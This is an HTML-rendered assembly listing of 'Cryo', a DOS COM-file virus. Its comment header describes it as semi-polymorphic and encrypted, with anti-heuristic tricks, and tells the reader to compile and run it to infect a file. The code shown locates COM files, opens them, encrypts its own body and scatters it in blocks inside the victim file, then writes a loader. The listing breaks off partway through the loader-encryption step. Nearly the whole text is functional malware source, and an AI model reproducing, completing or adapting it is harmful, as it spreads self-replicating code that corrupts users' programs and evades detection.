<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>CRYO.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; For Testing Purposes Only</span><span class="sc0">

</span><span class="sc1">; Cryo</span><span class="sc0">

</span><span class="sc1">; Compile this to exe file, run it and you will have one com file </span><span class="sc0">
</span><span class="sc1">; in current directory infected.</span><span class="sc0">

</span><span class="sc1">; Virus Description</span><span class="sc0">
</span><span class="sc1">; Type = Non resident Com Virus</span><span class="sc0">
</span><span class="sc1">; Desc = Uses non standard version of COM file infection. </span><span class="sc0">
</span><span class="sc1">;    Semi-Polymorphic,Crypted,Middle-File,and other stuff</span><span class="sc0">
</span><span class="sc1">; Size = 1389 bytes</span><span class="sc0">

</span><span class="sc1">; Small description - this virus is non-standard. It uses interesting technique</span><span class="sc0">
</span><span class="sc1">; of infecting Com files. This technique could be used in exe virus to.</span><span class="sc0">

</span><span class="sc1">; Step of file infecting</span><span class="sc0">
</span><span class="sc1">; 1. Find victim</span><span class="sc0">
</span><span class="sc1">; 2. Check size</span><span class="sc0">
</span><span class="sc1">; 3. If all ok, randomly gets offset for loader procedure, read's from there</span><span class="sc0">
</span><span class="sc1">;    loader procedure size + table size bytes</span><span class="sc0">
</span><span class="sc1">; 4. Then using loop, randomly gets offset for virus block in victim file.</span><span class="sc0">
</span><span class="sc1">;    If choosed area is free(no another blocks or loader), it read's block</span><span class="sc0">
</span><span class="sc1">;    size to variables, and writes here block. Offset of block in file is</span><span class="sc0">
</span><span class="sc1">;    stored in table (For each block, different entries)</span><span class="sc0">
</span><span class="sc1">; 5. When all blocks written, it writes procedure with newly created table.</span><span class="sc0">
</span><span class="sc1">; 6. Then it reads first 100 bytes and if first byte is JMP NEAR, jumps in</span><span class="sc0">
</span><span class="sc1">;    file to pointing position. Then it begins to semi-emul (calculate opcode</span><span class="sc0">
</span><span class="sc1">;    size) 50 bytes. When limit is reached, or any non-allowed opcode reached</span><span class="sc0">
</span><span class="sc1">;    (for example case,far jump,calls , etc) it returns control back. </span><span class="sc0">
</span><span class="sc1">; 7. At founded location it makes Near Call to Loader Procedure, and writes</span><span class="sc0">
</span><span class="sc1">;    to the end of file old parts of file.</span><span class="sc0">

</span><span class="sc1">; Contains some antiheuristics trick</span><span class="sc0">

</span><span class="sc5">Blocks</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">                </span><span class="sc1">; How many blocks build ?</span><span class="sc0">
                    </span><span class="sc1">; Minimum = 1</span><span class="sc0">
                    </span><span class="sc1">; Maximum = 200</span><span class="sc0">
                    </span><span class="sc1">; (This values is only recommended)</span><span class="sc0">

</span><span class="sc5">MinLen</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc4">+</span><span class="sc5">Vlen</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">   </span><span class="sc1">; Minimum size of Infecting file</span><span class="sc0">
                    </span><span class="sc1">; More blocks - needed bigger file size</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">; Store Ds 3 times</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1200h</span><span class="sc0">            </span><span class="sc1">; This is anti-heuristics trick</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">             </span><span class="sc1">; In Dos i2Fh,Ax=1200h would return 0FFh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VLen</span><span class="sc0">         </span><span class="sc1">; in al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; Al = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AllOk</span><span class="sc0">
</span><span class="sc5">FFF</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Crypt us by zero</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FFF</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zTbl</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Store offset of entry procedure</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zTbl</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; If it zero-no restore (1st time exec)</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoRestore</span><span class="sc0">            </span><span class="sc1">; This is done for first time run</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">           </span><span class="sc1">; Get offset of our "Call Loader"</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">][</span><span class="sc2">12</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; which is created by semi-emul proc.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">][</span><span class="sc2">12</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Fend</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Restore 3 bytes (Call to loader)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Si now points to end of file</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; Patch to com file</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ztbl</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Here is our loader procedure</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tbl</span><span class="sc0">       </span><span class="sc1">; Cx = number of blocks</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Blocks</span><span class="sc0">           </span><span class="sc1">; Bx = our table</span><span class="sc0">
    
</span><span class="sc5">LRest</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">; Store number of blocks</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">Bx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Di = block offset in file</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Patch to com file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; Ax = number of blocks</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">pvlen</span><span class="sc0">            </span><span class="sc1">; Cx = one block len</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Decrease Ax.</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CopyIt</span><span class="sc0">          </span><span class="sc1">; Zero ?</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Lvlen</span><span class="sc0">            </span><span class="sc1">; Yeap... If it zero, that's last block</span><span class="sc0">
                    </span><span class="sc1">; virus isn't padded to block size,</span><span class="sc0">
                    </span><span class="sc1">; so last block is bigger than any </span><span class="sc0">
                    </span><span class="sc1">; another</span><span class="sc0">
</span><span class="sc5">CopyIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; Copy block</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; Next block entry in table</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Restore num of blocks</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LRest</span><span class="sc0">          </span><span class="sc1">; again...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">             </span><span class="sc1">; Es = Cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl</span><span class="sc0">       </span><span class="sc1">; Di = offset to blocks table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Blocks</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Clean it.</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">
    
</span><span class="sc5">NoRestore</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Ds = Es = Cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">          </span><span class="sc1">; Setup DTA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">          </span><span class="sc1">; Findfirst file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fmask</span><span class="sc0">     </span><span class="sc1">; Dx = File mask</span><span class="sc0">
</span><span class="sc5">FFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Go !</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">FExist</span><span class="sc0">          </span><span class="sc1">; Founded one...</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">            </span><span class="sc1">; No files more...</span><span class="sc0">
</span><span class="sc5">FExist</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FDate</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Date = 0 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">          </span><span class="sc1">; If no - infect file</span><span class="sc0">
</span><span class="sc5">NFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">          </span><span class="sc1">; Next File...</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FFile</span><span class="sc0">           </span><span class="sc1">; Do it</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">Flen</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Store file end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fend</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; in our variables</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MinLen</span><span class="sc0">           </span><span class="sc1">; Less then minimum size ?</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">NFile</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Get encrypt value</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetRnd</span><span class="sc0">         </span><span class="sc1">; (for crypting blocks)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DPatch</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Store it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">            </span><span class="sc1">; Open file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fname</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Handle to Bx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Flen</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">-</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Get random from 0 to </span><span class="sc0">
                    </span><span class="sc1">; FileLen - (LoaderLen + TableLen)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">           </span><span class="sc1">; this made to skip entry call overwrite</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ztbl</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Store loader offset</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Jump to this area</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Point..</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; Lets read what stores there</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">   </span><span class="sc1">; Cx - LoaderLen+BlocksLen+DecryptorLen</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cnt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; Counter = 0</span><span class="sc0">
</span><span class="sc5">LetsRock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetOff</span><span class="sc0">         </span><span class="sc1">; Get random offset for block in file</span><span class="sc0">
                    </span><span class="sc1">; which is not used.</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">Cnt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tbl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store offset in table</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Point to it</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Store for later use</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">Cnt</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Calculate where to read old block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">pvlen</span><span class="sc0">            </span><span class="sc1">; of file</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cnt</span><span class="sc4">],</span><span class="sc5">Blocks</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; Last block ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoAdd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Lvlen</span><span class="sc0">            </span><span class="sc1">; If yes , add to it paricular size</span><span class="sc0">
</span><span class="sc5">NoAdd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc4">+</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
                    </span><span class="sc1">; Read old bytes</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Back to choosed offset</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">Cnt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">pvlen</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Calculate offset of block to be</span><span class="sc0">
                    </span><span class="sc1">; written</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StCrp</span><span class="sc0">     </span><span class="sc1">; Di = temp area</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">pvlen</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cnt</span><span class="sc4">],</span><span class="sc5">Blocks</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; Choose size of block</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoAddZ</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Lvlen</span><span class="sc0">
</span><span class="sc5">NoAddZ</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">LCrypt</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; Crypt block...</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Dpatch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LCrypt</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write crypted block</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cnt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cnt</span><span class="sc4">],</span><span class="sc5">Blocks</span><span class="sc0">        </span><span class="sc1">; Lets write next block</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">LetsRock</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">zTbl</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get offset of loader</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Point to it </span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc0">        </span><span class="sc1">; Lets crypt loader with tables</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
